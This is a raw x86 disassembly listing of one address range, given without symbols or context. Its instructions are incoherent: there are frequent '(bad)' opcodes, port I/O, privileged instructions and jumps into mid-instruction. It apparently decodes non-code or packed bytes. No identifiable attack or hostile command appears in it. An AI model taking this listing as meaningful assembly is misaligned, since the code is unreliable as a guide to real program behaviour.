  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
